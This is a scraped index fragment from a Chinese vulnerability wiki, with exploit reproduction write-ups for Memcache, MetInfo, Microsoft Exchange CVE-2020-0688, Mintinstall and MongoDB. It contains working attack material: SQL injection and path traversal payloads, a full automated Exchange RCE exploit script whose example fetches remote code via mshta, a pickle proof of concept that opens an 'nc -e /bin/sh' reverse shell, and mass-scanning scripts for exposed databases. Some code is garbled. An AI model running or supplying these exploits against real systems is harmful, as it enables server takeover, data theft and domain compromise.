https://mp.weixin.qq.com/s?__biz=MzU5NDgxODU1MQ==&mid=2247486415&idx=1&sn=0e413fdfd22f21580e0c70251e53a7cb&chksm=fe7a2f57c90da64190913e4f40d5f854dcc0c794ac988ce667f1ba0d4a262575b5c4a67b65a1&mpshare=1&scene=1&srcid=&sharer_sharetime=1582037009796&sharer_shareid=346bf064ccfaeb680ec3e1af3a4fc9a8&key=36a0b0f21e7aca1c7ade662e9184d730b9617a817ebf64e5bbc6048142797fa6b31c917039b5d1308f1d16cf77ba9f43d541a1bd197ead9b66bb01969c4f1bf2c54e19862f1f9bc1f449495c27554e90&ascene=1&uin=MTU0OTU5NDkzMA%3D%3D&devicetype=Windows+10&version=62080079&lang=zh_CN&exportkey=AUm27aB0HayWjmPDBsXi7NU%3D&pass_ticket=VkgA7hk5gRtBGyr1o4%2Bh5PlNbfx095JODofk2U16AOMJewFkqv%2BeZkeziLm0G2um 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-19 20:55:17 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Memcache/1.html":{"url":"0day/Memcache/1.html","title":"Memcache未授权访问","keywords":"","body":"Memcache未授权访问 一、漏洞简介 memcached是一套分布式的高速缓存系统。它以Key-Value（键值对）形式将数据存储在内存中，这些数据通常是应用读取频繁的。正因为内存中数据的读取远远大于硬盘，因此可以用来加速应用的访问。 二、影响范围 三、复现过程 1.扫描探测 nmap -sV -p 11211 --script memcached-info 0.0.0.0 ##! /usr/bin/env python ## _*_ coding:utf-8 _*_ def Memcache_check(ip, port=11211, timeout=5): try: socket.setdefaulttimeout(timeout) s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((ip, int(port))) s.send(\"stats\\r\\n\") result = s.recv(1024) if \"STAT version\" in result: print '[+] Memcache Unauthorized: ' +ip+':'+str(port) except Exception, e: pass if __name__ == '__main__': Elasticsearch_check(\"127.0.0.1\") 2.攻击利用 2.1 基础部分 通过一个cheat sheet了解一下Memcached的协议。Memcached的语法由如下元素组成 {COMMAND}0x20{ARGUMENT}(LF|CRLF) command字段有如下几条命令 存储操作(set, add, replace, append, prepend, cas) 检索操作 (get, gets) 删除操作 (delete) 增减操作 (incr, decr) touch slabs reassign slabs automove lru_crawler 统计操作(stats items, slabs, cachedump) 其他操作 (version, flush_all, quit) Command 描述 实例 get 读某个值 get mykey set 强制设置某个键值 set mykey 0 60 5 add 添加新键值对 add newkey 0 60 5 replace 覆盖已经存在的key replace key 0 60 5 flush_all 让所有条目失效 flush_all stats 打印当前状态 stats stats malloc 打印内存状态 stats malloc version | 打印Memcached版本 | version stats //查看memcache 服务状态 stats items //查看所有items stats cachedump 32 0 //获得缓存key get :state:264861539228401373:261588 //通过key读取相应value ，获得实际缓存内容，造成敏感信息泄露 2.2 建立连接并获取信息 telnet 11211，或 nc -vv 11211，无需用户名密码，可以直接连接memcache 服务的11211端口。 附赠大佬写的文章 Discuz!因Memcached未授权访问导致的RCE 3.防范措施 1.限制访问 如果memcache没有对外访问的必要，可在memcached启动的时候指定绑定的ip地址为 127.0.0.1。其中 -l 参数指定为本机地址。例如： memcached -d -m 1024 -u root -l 127.0.0.1 -p 11211 -c 1024 -P /tmp/memcached.pid 或者 vim /etc/sysconfig/memcached，修改配置文件 OPTIONS=\"-l 127.0.0.1\"，只能本机访问，不对公网开放，保存退出 /etc/init.d/memcached reload 2.防火墙 // accept ## iptables -A INPUT -p tcp -s 127.0.0.1 --dport 11211 -j ACCEPT ## iptables -A INPUT -p udp -s 127.0.0.1 --dport 11211 -j ACCEPT // drop ## iptables -I INPUT -p tcp --dport 11211 -j DROP ## iptables -I INPUT -p udp --dport 11211 -j DROP // 保存规则并重启 iptables ## service iptables save ## service iptables restart 3.使用最小化权限账号运行Memcached服务 使用普通权限账号运行，指定Memcached用户。 memcached -d -m 1024 -u memcached -l 127.0.0.1 -p 11211 -c 1024 -P /tmp/memcached.pid 4.启用认证功能 Memcached本身没有做验证访问模块,Memcached从1.4.3版本开始，能支持SASL认证。SASL认证详细配置手册 5.修改默认端口 修改默认11211监听端口为11222端口。在Linux环境中运行以下命令： memcached -d -m 1024 -u memcached -l 127.0.0.1 -p 11222 -c 1024 -P /tmp/memcached.pid 6.定期升级 参考: http://lzone.de/cheat-sheet/memcached https://www.secpulse.com/archives/49659.html https://www.sensepost.com/blog/2010/blackhat-write-up-go-derper-and-mining-memcaches/ https://www.blackhat.com/docs/us-14/materials/us-14-Novikov-The-New-Page-Of-Injections-Book-Memcached-Injections-WP.pdf http://niiconsulting.com/checkmate/2013/05/memcache-exploit/ https://xz.aliyun.com/t/2018 http://drops.xmd5.com/static/drops/web-8987.html https://blog.csdn.net/microzone/article/details/79262549 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-11-04 00:39:10 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/MetInfo/1.html":{"url":"0day/MetInfo/1.html","title":"Metinfo 6.1.2 SQL注入","keywords":"","body":"Metinfo 6.1.2 SQL注入 一、漏洞简介 二、漏洞影响 三、复现过程 漏洞分析 漏洞文件：/var/www/html/metinfo6.1.2/app/system/message/web/message.class.php 漏洞函数：add 37-51行 public function add($info) { global $_M; if(!$_M[form][id]){ $message=DB::get_one(\"select * from {$_M[table][column]} where module= 7 and lang ='{$_M[form][lang]}'\"); $_M[form][id]=$message[id]; } $met_fd_ok=DB::get_one(\"select * from {$_M[table][config]} where lang ='{$_M[form][lang]}' and name= 'met_fd_ok' and columnid = {$_M[form][id]}\"); $_M[config][met_fd_ok]= $met_fd_ok[value]; if(!$_M[config][met_fd_ok])okinfo('javascript:history.back();',\"{$_M[word][Feedback5]}\"); if($_M[config][met_memberlogin_code]){ if(!load::sys_class('pin', 'new')->check_pin($_M['form']['code'])){ okinfo(-1, $_M['word']['membercode']); } } 漏洞触发点： $met_fd_ok=DB::get_one(\"select * from {$_M[table][config]} where lang ='{$_M[form][lang]}' and name= 'met_fd_ok' and columnid = {$_M[form][id]}\"); 由于无单引号过滤导致sql注入，这个时候尝试注入发现关键词全被替换了，无法注入。于是查看__controler函数发现调用了父类的初始化函数。 class feedback extends web 跟进web类，没有对用户传入的数据进行过滤等操作，却初始化了common类 class web extends common 查看Common类的初始化函数发现了问题所在 public function __construct() { global $_M;//全局数组$_M ob_start();//开启缓存 $this->load_mysql();//数据库连接 $this->load_form();//表单过滤 $this->load_lang();//加载语言配置 $this->load_config_global();//加载全站配置数据 $this->load_url_site(); $this->load_config_lang();//加载当前语言配置数据 $this->load_url();//加载url数据 } 跟踪 $this→load_form() 函数 protected function load_form() { global $_M; $_M['form'] =array(); isset($_REQUEST['GLOBALS']) && exit('Access Error'); foreach($_COOKIE as $_key => $_value) { $_key{0} != '_' && $_M['form'][$_key] = daddslashes($_value); } foreach($_POST as $_key => $_value) { $_key{0} != '_' && $_M['form'][$_key] = daddslashes($_value); } foreach($_GET as $_key => $_value) { $_key{0} != '_' && $_M['form'][$_key] = daddslashes($_value); } if(is_numeric($_M['form']['lang'])){//伪静态兼容 $_M['form']['page'] = $_M['form']['lang']; $_M['form']['lang'] = ''; } if($_M['form']['metid'] == 'list'){ $_M['form']['list'] = 1; $_M['form']['metid'] = $_M['form']['page']; $_M['form']['page'] = 1; } if(!preg_match('/^[0-9A-Za-z]+$/', $_M['form']['lang']) && $_M['form']['lang']){ echo \"No data in the database,please reinstall.\"; die(); } } 把COOKIE、POST、GET 传入 daddslashes函数进行过滤 function daddslashes($string, $force = 0) { !defined('MAGIC_QUOTES_GPC') && define('MAGIC_QUOTES_GPC', get_magic_quotes_gpc()); if(!MAGIC_QUOTES_GPC || $force) { if(is_array($string)) { foreach($string as $key => $val) { $string[$key] = daddslashes($val, $force); } } else { if(!defined('IN_ADMIN')){ $string = trim(addslashes(sqlinsert($string))); }else{ $string = trim(addslashes($string)); } } } return $string; } 这里判断是否开启了get_magic_quotes_gpc() 如果没开启或者 $force !=0 就进入过滤。 然而最重要的环节在这里 if(!defined('IN_ADMIN')){ $string = trim(addslashes(sqlinsert($string))); }else{ $string = trim(addslashes($string)); } 判断 IN_ADMIN 常量是否已经定义了，如果没定义就使用$string = trim(addslashes(sqlinsert($string)));来过滤我们的值 而如果定义了就使用$string = trim(addslashes($string));来过滤。 刚刚我们进行sql注入测试失败而且语句被过滤了， addslashes只过滤特殊字符，所以我们肯定是被 sqlinsert函数给过滤了。导致我们无法sql注入。至于sqlinsert函数我就不贴出来了，我们要做的是饶过这个函数，而不是饶过他这个规则。 defined('IN_ADMIN') 我们需要找这个常量在哪里定义的。其实写这句话有点多余，看过我之前几篇Metinfo漏洞的话应该就会发现问题了。我写过一个关于/admin/index.php文件任意调用带do方法的问题。 然后我们打开这个文件看一下。 没错这个常量就是在这个文件定义的。而且他可以调用任意带do方法。不过问题又来了，漏洞函数是add并且不带do，那就找调用白，于是找到 domessage这个函数。 domessage方法 18-24 public function domessage() { global $_M; if($_M['form']['action'] == 'add'){ $this->check_field(); $this→add($_M['form']); 这里在调用 add方法之前先调用了 check_field方法，我们要做的就是保证程序能够顺利执行到add方法，研究了一会发现只需要正常留言，把它传递的参数拷下来就ok了。 然后顺利执行到了add方法，成功的进行了sql注入。 payload： http:/0-sec.org/metinfo6//admin/index.php?m=web&n=message&c=message&a=domessage&action=add&lang=cn¶137=1¶186=1¶138=1¶139=1¶140=1&id=42 这里说一下这个id=42，这个值42是不能修改的，目的是让他返回验证码错误，饶过了第一层判断。 if(!$_M[config][met_fd_ok])okinfo('javascript:history.back();',\"{$_M[word][Feedback5]}\"); if($_M[config][met_memberlogin_code]){ if(!load::sys_class('pin', 'new')->check_pin($_M['form']['code'])){ okinfo(-1, $_M['word']['membercode']); } } 至于为什么让他饶过第一层判断返回验证码错误，这样的话我们可以布尔盲注，否则只能进行时间注入。这里不多解释，自己研究一下。 解决方法 修改文件：metinfo6.1.2/app/system/message/web/message.class.php 修改内容： $met_fd_ok=DB::get_one(\"select * from {$_M[table][config]} where lang ='{$_M[form][lang]}' and name= 'met_fd_ok' and columnid = {$_M[form][id]}\"); 修改为： $met_fd_ok=DB::get_one(\"select * from {$_M[table][config]} where lang ='{$_M[form][lang]}' and name= 'met_fd_ok' and columnid = ‘{$_M[form][id]}’\"); 这样就解决了。 漏洞验证脚本 https://github.com/ianxtianxt/Metinfo-6.1.2-SQL-injection 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-11-21 21:08:35 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/MetInfo/2.html":{"url":"0day/MetInfo/2.html","title":"Metinfo任意文件读取","keywords":"","body":"MetInfo 任意文件读取 一、漏洞简介 MetInfo是一套使用PHP和Mysql开发的内容管理系统。 MetInfo 6.0.0~6.1.0版本中的 old_thumb.class.php文件存在任意文件读取漏洞。攻击者可利用漏洞读取网站上的敏感文件 二、漏洞影响 MetInfo 6.0.0 MetInfo 6.1.0 三、复现过程 漏洞分析 进攻分析 看下\\MetInfo6\\app\\system\\include\\module\\old_thumb.class.php 从代码中看用看到，$dir直接由$_GET['dir']传递进来，并将../置空。目标是进入到第一个，如果里面的readfile($dir);，读取文件。看看如果语句的条件，的英文外面一个strstr函数，判断$dir中http字符串的首次出现位置，实质上，要进入到这个if语句里面，$dir中必须包含http字符串。里面的将$dir中包含$_M['url']['site']的部分放置空，这里可以不用管。 从上面的分析可以构造出有效负载，只要$dir里包含http字符串就可以进入到readfile函数从而重新读取任意函数，然后可以使用..././来进行目录替换，因为../会被置空，所以最终payload如下 ?dir=..././http/..././config/config_db.php ?dir=.....///http/.....///config/config_db.php ?dir=http/.....///.....///config/config_db.php ?dir=http\\..\\..\\config\\config_db.php 漏洞复现 要先找到调用old_thumb.class.php的文件，看到include/thumb.php，可以从这个文件里面进入到old_thumb.class.php 所以我们通过thumb.php将构造好的$dir传入即可。 可以看到成功的读取到了config/config_db.php的内容。 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-11-21 21:24:47 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/MetInfo/MetInfo系统中一处旧插件导致的ssrf.html":{"url":"0day/MetInfo/MetInfo系统中一处旧插件导致的ssrf.html","title":"MetInfo系统中一处旧插件导致的ssrf","keywords":"","body":"MetInfo系统中隐藏的一处旧插件导致的ssrf 一、漏洞简介 二、漏洞影响 三、复现过程 利用的话，ssrf嘛你可以扫描扫描端口咯。 我这里的话，简单说明利用一下 分析过程 文件：MetInfo_v6.1.0\\app\\app\\ueditor\\php\\Uploader.class.php get_headers这里是验证资源是否存在的，不存在就不走下面了，所以这里可以用来判断端口，例如81端口不存在那么他这里就会直接报错了 $this->stateInfo = $this->getStateInfo(\"ERROR_DEAD_LINK\"); 这个时候我还不清楚的$this->fileField 的值是向哪里获取的=-= 又搜索了一下。 需要注意的是：$type == \"remote\" 才能进入$this->saveRemote();流程引起漏洞触发。 搜索一下 打开文件：MetInfo_v6.1.0\\app\\app\\ueditor\\php\\action_crawler.php 打开文件以后，虽然引入了Uploader.class.php 但是没有引入$CONFIG所以直接调用代码会报错，那么就继续找引入 搜索一下 打开文件：MetInfo_v6.1.0\\app\\app\\ueditor\\php\\controller.php 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-11-20 22:45:55 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Microsoft Exchange/CVE-2020-0688.html":{"url":"0day/Microsoft Exchange/CVE-2020-0688.html","title":"（CVE-2020-0688）Microsoft Exchange 远程命令执行漏洞","keywords":"","body":"（CVE-2020-0688）Microsoft Exchange 远程命令执行漏洞 一、漏洞简介 该漏洞是由于Exchange Control Panel(ECP)组件中使用了静态秘钥（validationKey和decryptionKey）所导致的。 所有Microsoft Exchange Server在安装后的web.config文件中都拥有相同的validationKey和decryptionKey。这些密钥用于保证ViewState的安全性。而ViewState是ASP.NET Web应用以序列化格式存储在客户机上的服务端数据。客户端通过__VIEWSTATE请求参数将这些数据返回给服务器。 经过身份验证的攻击者可以从身份验证的session中收集ViewStateUserKey，并在登录请求的原始响应中获得__VIEWSTATEGENERATOR。通过这两个值可以利用YSoSerial.net工具生成恶意的ViewState，从而在ECP中执行任意的.NET代码。由于ECP应用程序是以SYSTEM权限运行的，因而成功利用此漏洞的攻击者可以以SYSTEM身份执行任意代码，并完全控制目标Exchange服务器。 二、漏洞影响 Microsoft Exchange Server 2010 Service Pack 3 Update Rollup 30 Microsoft Exchange Server 2013 Cumulative Update 23 Microsoft Exchange Server 2016 Cumulative Update 14 Microsoft Exchange Server 2016 Cumulative Update 15 Microsoft Exchange Server 2019 Cumulative Update 3 Microsoft Exchange Server 2019 Cumulative Update 4 三、复现过程 需要一个普通权限的登录账号 根据网上的漏洞利用方式分析，漏洞出现在Exchange Control Panel （ECP）组件中，所有Microsoft Exchange Server在安装后的web.config文件中都拥有相同的validationKey和decryptionKey。 这些密钥用于保证ViewState的安全性，而ViewState是ASP.NET Web应用以序列化格式存储在客户机上的服务端数据。由于密钥是静态的，攻击者有了这两个密钥，就可以使用 YSoSerial.net 生成序列化后的ViewState数据，从而在Exchange Control Panel web应用上执行任意.net代码。 静态的密钥在所有Microsoft Exchange Server在安装后的C:\\Program Files\\Microsoft\\Exchange Server\\V15\\ClientAccess\\ecp\\web.config文件中都是相同的： validationkey = CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF validationalg = SHA1 我们要构造ViewState还需要viewstateuserkey和__VIEWSTATEGENERATOR， viewstateuserkey为用户登录后的ASP.NET_SessionId： __VIEWSTATEGENERATOR在/ecp/default.aspx的前端页面里面直接获取： 当拥有了validationkey,validationalg,viewstateuserkey,__VIEWSTATEGENERATOR，使用YSoSerial.net生成序列化后的恶意的ViewState数据： ysoserial.exe -p ViewState -g TextFormattingRunProperties -c \"calc.exe\" --validationalg=\"SHA1\" --validationkey=\"CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF\" --generator=\"B97B4E27\" --viewstateuserkey=\"2fdc8b0d-dcfb-4d0a-b464-95b9a2dcc968\" --isdebug –-islegacy 构造以下URL，使用生成的payload替换，使用上面所说的value值替换，最后用GET请求发送给服务器即可。 http://www.0-sec.org/ecp/default.aspx?__VIEWSTATEGENERATOR=&__VIEWSTATE= 收到dns请求 由于Exchange Server的机器用户具备SYSTEM权限，默认在域内拥有WriteAcl的权限，因此，可以通过修改ACL的DS-Replication-Get-Changes和DS-Replication-Get-Changes-All来赋予任何一个用户Dcsync的权限，所以这个漏洞的最大危害在于：在域内拥有一个普通用户权限的情况下，通过Exchange Server上以system用户的身份执行任意的命令，再利用Exchange Server的WriteAcl权限，从而达到域管权限。 附录 经过简单测试，已知可利用路径： /ecp/default.aspx __VIEWSTATEGENERATOR=B97B4E27 /ecp/PersonalSettings/HomePage.aspx?showhelp=false& __VIEWSTATEGENERATOR=1D01FD4E /ecp/PersonalSettings/HomePage.aspx?showhelp=false& __VIEWSTATEGENERATOR=1D01FD4E /ecp/Organize/AutomaticReplies.slab?showhelp=false& __VIEWSTATEGENERATOR=FD338EE0 /ecp/RulesEditor/InboxRules.slab?showhelp=false& __VIEWSTATEGENERATOR=FD338EE0 /ecp/Organize/DeliveryReports.slab?showhelp=false& __VIEWSTATEGENERATOR=FD338EE0 /ecp/MyGroups/PersonalGroups.aspx?showhelp=false& __VIEWSTATEGENERATOR=A767F62B /ecp/MyGroups/ViewDistributionGroup.aspx?pwmcid=1&id=38f4bec5-704f-4272-a654-95d53150e2ae&ReturnObjectType=1 __VIEWSTATEGENERATOR=321473B8 /ecp/Customize/Messaging.aspx?showhelp=false& __VIEWSTATEGENERATOR=9C5731F0 /ecp/Customize/General.aspx?showhelp=false& __VIEWSTATEGENERATOR=72B13321 /ecp/Customize/Calendar.aspx?showhelp=false& __VIEWSTATEGENERATOR=4AD51055 /ecp/Customize/SentItems.aspx?showhelp=false& __VIEWSTATEGENERATOR=4466B13F /ecp/PersonalSettings/Password.aspx?showhelp=false& __VIEWSTATEGENERATOR=59543DCA /ecp/SMS/TextMessaging.slab?showhelp=false& __VIEWSTATEGENERATOR=FD338EE0 /ecp/TroubleShooting/MobileDevices.slab?showhelp=false& __VIEWSTATEGENERATOR=FD338EE0 /ecp/Customize/Regional.aspx?showhelp=false& __VIEWSTATEGENERATOR=9097CD08 /ecp/MyGroups/SearchAllGroups.slab?pwmcid=3&ReturnObjectType=1 __VIEWSTATEGENERATOR=FD338EE0 /ecp/Security/BlockOrAllow.aspx?showhelp=false& __VIEWSTATEGENERATOR=362253EF 全自动（支持加密） CVE-2020-0688_EXP Auto trigger payload python3 CVE-2020-0688_EXP.py -h usage: CVE-2020-0688_EXP.py [-h] -s SERVER -u USER -p PASSWORD -c CMD [-e] optional arguments: -h, --help show this help message and exit -s SERVER, --server ECP Server URL Example: http://ip/owa -u USER, --user USER login account Example: domain\\user -p PASSWORD, --password PASSWORD -c CMD, --cmd CMD Command u want to execute -e, --encrypt Encrypt the payload example: python CVE-2020-0688_EXP.py -s https://mail.x.com/ -u user@x.com -p passwd -c \"mshta http://1.1.1.1/test.hta\" 需要把ysoserial.exe 放当前目录 https://github.com/ianxtianxt/ysoserial.net/ # encoding: UTF-8 import requests import readline import argparse import re import sys import os import urllib3 from urllib.parse import urlparse from urllib.parse import quote urllib3.disable_warnings() ysoserial_path = os.path.abspath(os.path.dirname(__file__))+\"/ysoserial-1.32/\" session = requests.Session() def get_value(url, user, pwd): print(\"[*] Tring to login owa...\") tmp = urlparse(url) base_url = \"{}://{}\".format(tmp.scheme, tmp.netloc) paramsPost = {\"password\": \"\"+pwd+\"\", \"isUtf8\": \"1\", \"passwordText\": \"\", \"trusted\": \"4\", \"destination\": \"\"+url+\"\", \"flags\": \"4\", \"forcedownlevel\": \"0\", \"username\": \"\"+user+\"\"} headers = {\"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\", \"Upgrade-Insecure-Requests\": \"1\", \"User-Agent\": \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:73.0) Gecko/20100101 Firefox/73.0\", \"Connection\": \"close\", \"Accept-Language\": \"en-US,en;q=0.5\", \"Accept-Encoding\": \"gzip, deflate\", \"Content-Type\": \"application/x-www-form-urlencoded\", \"Cookie\": \"PrivateComputer=true; PBack=0\"} cookies = {\"PBack\": \"0\", \"PrivateComputer\": \"true\"} login_url = base_url + '/owa/auth.owa' print(\"[+] Login url: {}\".format(login_url)) try: login = session.post(login_url, data=paramsPost, headers=headers, verify=False, timeout=30) print(\"[*] Status code: %i\" % login.status_code) if \"reason=\" in login.text or \"reason=\" in login.url and \"owaLoading\" in login.text: print(\"[!] Login Incorrect, please try again with a different account..\") # sys.exit(1) #print(str(response.text)) except Exception as e: print(\"[!] login error , error: {}\".format(e)) sys.exit(1) print(\"[+] Login successfully! \") try: print(\"[*] Tring to get __VIEWSTATEGENERATOR...\") target_url = \"{}/ecp/default.aspx\".format(base_url) new_response = session.get(target_url, verify=False, timeout=15) view = re.compile( 'id=\"__VIEWSTATEGENERATOR\" value=\"(.+?)\"').findall(str(new_response.text))[0] print(\"[+] Done! __VIEWSTATEGENERATOR:{}\".format(view)) except: view = \"B97B4E27\" print(\"[*] Can't get __VIEWSTATEGENERATOR, use default value: {}\".format(view)) try: print(\"[*] Tring to get ASP.NET_SessionId....\") key = session.cookies['ASP.NET_SessionId'] print(\"[+] Done! ASP.NET_SessionId: {}\".format(key)) except Exception as e: key = None print(\"[!] Get ASP.NET_SessionId error, error: {} \\n[*] Exit..\".format(e)) return view, key, base_url def ysoserial(cmd): cmd = ysoserial_path+cmd r = os.popen(cmd) res = r.readlines() return res[-1] def main(): parser = argparse.ArgumentParser() parser.add_argument(\"-s\", \"--server\", required=True, help=\"ECP Server URL Example: http://ip/owa\") parser.add_argument(\"-u\", \"--user\", required=True, help=\"login account Example: domain\\\\user\") parser.add_argument(\"-p\", \"--password\", required=True, help=\"Password\") parser.add_argument(\"-c\", \"--cmd\", help=\"Command u want to execute\", required=True) parser.add_argument(\"-e\", \"--encrypt\", help=\"Encrypt the payload\", action='store_true',default=False) args = parser.parse_args() url = args.server print(\"[*] Start to exploit..\") user = args.user pwd = args.password command = args.cmd view, key, base_url = get_value(url, user, pwd) if key is None: key = 'test' sys.exit(1) ex_payload = \"\"\"ysoserial.exe -p ViewState -g TextFormattingRunProperties -c \"{}\" --validationalg=\"SHA1\" --validationkey=\"CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF\" --generator=\"{}\" --viewstateuserkey=\"{}\" --islegacy \"\"\".format(command,view,key) if args.encrypt: re_payload = ex_payload + ' --decryptionalg=\"3DES\" --decryptionkey=\"E9D2490BD0075B51D1BA5288514514AF\" --isencrypted' else: re_payload = ex_payload + \" --isdebug\" print(\"\\n\"+re_payload) out_payload = ysoserial(re_payload) if args.encrypt: final_exp = \"{}/ecp/default.aspx?__VIEWSTATEENCRYPTED=&__VIEWSTATE={}\".format(base_url, quote(out_payload)) else: final_exp = \"{}/ecp/default.aspx?__VIEWSTATEGENERATOR={}&__VIEWSTATE={}\".format(base_url, view, quote(out_payload)) print(\"\\n[+] Exp url: {}\".format(final_exp)) print(\"\\n[*] Auto trigger payload..\") status = session.get(final_exp,verify=False,timeout=15) if status.status_code==500: print(\"[*] Status code: %i, Maybe success!\" % status.status_code) if __name__ == \"__main__\": main() 参考链接 https://www.anquanke.com/post/id/199772 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-11 15:03:41 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Mintinstall/1.html":{"url":"0day/Mintinstall/1.html","title":"（CVE-2019-17080）Mintinstall object injection","keywords":"","body":"（CVE-2019-17080）Mintinstall object injection 一、漏洞简介 Linux mint软件管理器（v 7.9.5 / 9）由于配置错误而导致对象注入和任意代码执行。 Linux Mint Software Manager（v 7.9.5 / 9）由于配置错误而导致我们执行对象注入和任意代码 二、漏洞影响 Version: 7.9.9 三、复现过程 mintinsall 我们运行Mint软件管理器还会检查是否有新注释，如果new-reviews.list 下载中有 新注释并写入文件。 如果有新评论，请从文件new-reviews.list下载并写入文件 code mintinstall.py 首次启动软件管理器时，它会从评论模块调用ReviewCache（）类。 它如何处理数据？ code reviews.py 当ReviewCache类启动（init）时，它将调用_load_cache（）函数。 加载缓存功能读取REVIEWS_CACHE变量中的文件，并在pickle模块的帮助下，对文件中的数据进行反序列化并在内存中保存一些值 当我检查文件时，看起来好像可以写文件。 Pickle 因为我们可以使用模块执行序列化/反序列化操作，所以可以包含模块并使用reduce方法执行任意代码。 如果您尝试反序列化文件，则我们的恶意代码将起作用。 cos system (S'nc -e /bin/sh 192.168.2.138 4545' tR. >>modül adı c{os} >> fonksiyon ( >> işaretleyici nesnesi S >> tırnak sonuna kadar okuyup stack'e at tR. >> stackte olanları çagır ve sonucu stacke yerleştir. poc import os import sys def shellCode(payload): with open(f\"{os.getenv('HOME')}/.cache/mintinstall/reviews.cache\",\"w\") as wb: wb.write(payload) print(\"[+] Start mintinstall\") if __name__==\"__main__\": shellCode(f\"\"\"cos\\nsystem\\n(S\"nc -e /bin/sh {sys.argv[1]} {sys.argv[2]}\"\\ntR.\"\"\") else: print(\"[!] exploit.py [IP] [PORT]\") 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-14 16:50:34 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Mongo DB/1.html":{"url":"0day/Mongo DB/1.html","title":"Mongo DB未授权访问","keywords":"","body":"MongoDB未授权访问 一、漏洞简介 MongoDB 默认直接连接，无须身份验证，如果当前机器可以公网访问，且不注意Mongodb 端口（默认 27017）的开放状态，那么Mongodb就会产生安全风险，被利用此配置漏洞，入侵数据库。 使用默认 mongod 命令启动 Mongodb 机器可以被公网访问 在公网上开放了 Mongodb 端口 数据库隐私泄露 数据库被清空 数据库运行缓慢 二、影响范围 三、复现过程 1. 扫描探测 2. 下载： http://nmap.org/svn/scripts/mongodb-info.nse nmap -p 27017 --script mongodb-info vim /etc/mongodb.conf dbpath = /data/ logpath = /var/logs/mongodb.log ##port = 27017 ##fork = true bind_ip = 0.0.0.0 ./mongod –config mongodb.conf //启动mongodb加载配置mongodb.conf 1.1 基础 https://www.jianshu.com/p/8bf26effa737 http://www.runoob.com/mongodb/mongodb-tutorial.html https://itbilu.com/database/mongo/E1tWQz4_e.html 1.2 批量扫描未授权 import socket import sys import pymongo ipcons = [] def Scanner(ip): global ipcons sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM) sk.settimeout(0.3) try: sk.connect((ip,27017)) ipcons.append(ip) sk.close() except Exception: pass def ip2num(ip): ip=[int(x) for x in ip.split('.')] return ip[0] >24, (num & 0x00ff0000) >>16, (num & 0x0000ff00) >>8, num & 0x000000ff ) def get_ip(ip): start,end = [ip2num(x) for x in ip.split(' ') ] return [ num2ip(num) for num in range(start,end+1) if num & 0xff ] startIp = sys.argv[1] endIp = sys.argv[2] iplist = get_ip(sys.argv[1]+\" \"+sys.argv[2]) for i in iplist: Scanner(i) def connMon(ip_addr): print ' Connect mongodb: ' + ip_addr + ':27017' try: conn = pymongo.MongoClient(ip_addr,27017,socketTimeoutMS=3000) dbname = conn.database_names() print \"success\" except Exception as e: print \"error\" print ipcons for ipaddr in ipcons: connMon(ipaddr) print \"=================\" 1.3 shodan扫描脚本 ##!/usr/bin/python ## -*- coding: UTF-8 -*- ''' @Author：joy_nick @博客：http://byd.dropsec.xyz/ ''' import shodan import os iplist = [] ip_list = [] shodan_ip_list = [] def shodanSearch(keywords): SHODAN_API_KEY = \"your key\" api = shodan.Shodan(SHODAN_API_KEY) total = 0 try: results = api.search(keywords) total = int(results['total']) for result in results['matches']: ##iplist.append({\"ip\":result['ip_str'],\"country\":result['location']['country_name']}) iplist.append(result['ip_str']) for i in range(len(iplist)): ip_list = iplist[i].encode('utf-8') shodan_ip_list.append(ip_list) s = '\\n'.join(shodan_ip_list) with open('shodan_ip_list.txt','w') as output: output.write(s) except shodan.APIError, e: print 'Error: %s' % e if __name__ == '__main__': shodanSearch('redis') 查询操作 2. 爆破脚本 https://github.com/netxfly/x-crack 4. 防范措施 (1).新建管理账户开启MongoDB授权新建终端[参数默认可以不加，若有自定义参数，才要加上，下同] mongod --port 27017 --dbpath /data/db1 另起一个终端，运行下列命令 mongo --port 27017 use admin db.createUser( { user: \"adminUser\", pwd: \"adminPass\", roles: [ { role: \"userAdminAnyDatabase\", db: \"admin\" } ] } ) 管理员创建成功，现在拥有了用户管理员 用户名:adminUser 密码:adminPass (2).本地访问bind 127.0.0.1 (3).修改默认端口修改默认的mongoDB端口(默认为: TCP 27017)为其他端口 (4).禁用HTTP和REST端口MongoDB自身带有一个HTTP服务和并支持REST接口。在2.6以后这些接口默认是关闭的。mongoDB默认会使用默认端口监听web服务，一般不需要通过web方式进行远程管理，建议禁用。修改配置文件或在启动的时候选择–nohttpinterface 参数nohttpinterface = false(5).开启日志审计功能审计功能可以用来记录用户对数据库的所有相关操作。这些记录可以让系统管理员在需要的时候分析数据库在什么时段发生了什么事情(6).开启auth认证 /etc/mongodb.conf　　 auth = 